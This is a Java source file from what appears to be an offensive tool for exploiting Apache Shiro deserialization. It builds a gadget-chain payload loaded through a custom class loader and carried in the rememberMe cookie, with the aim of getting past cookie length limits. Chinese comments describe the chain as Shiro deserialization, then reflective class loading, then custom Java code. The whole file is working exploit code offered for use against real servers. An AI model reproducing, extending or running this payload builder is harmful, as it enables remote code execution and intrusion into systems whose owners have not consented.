package com.sma11new.exp.shiro.attack.bypass;

import com.sma11new.exp.shiro.ShiroAttack;
import com.sma11new.exp.shiro.attack.echo.ClassLoader;
import com.sma11new.utils.Tools;
import javassist.ClassPool;

public class LengthLimit {

    public static String classLoaderByPost(String gadget, String key, String cookieName) {
        ClassPool pool = ClassPool.getDefault();
        String result = null;
        ClassLoader.className = Tools.getRandomString(6);
        try {
            // 双重加载的方式：Shiro反序列化 -> 反射类加载 -> 自定义java代码
            // 感觉有些复杂，用不到这种方式。
            /*Class<? extends EchoPayload> echoClazz = EchoPayload.Utils.getPayloadClass("ClassLoader");
            EchoPayload echoObj = echoClazz.newInstance();
            CtClass clazz = echoObj.genPayload(pool);
            clazz.getClassFile().setMajorVersion(50);
            System.out.println("className: " + clazz.getName());
            ShiroAttack.bypassData[0] = URLEncoder.encode(Base64.encodeToString(clazz.toBytecode()));*/

            ShiroAttack.enableCustomLoader = false;
            result = ShiroAttack.gadgetPayload(gadget, "CustomLoader", key, cookieName);
            ShiroAttack.enableCustomLoader = true;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }
}
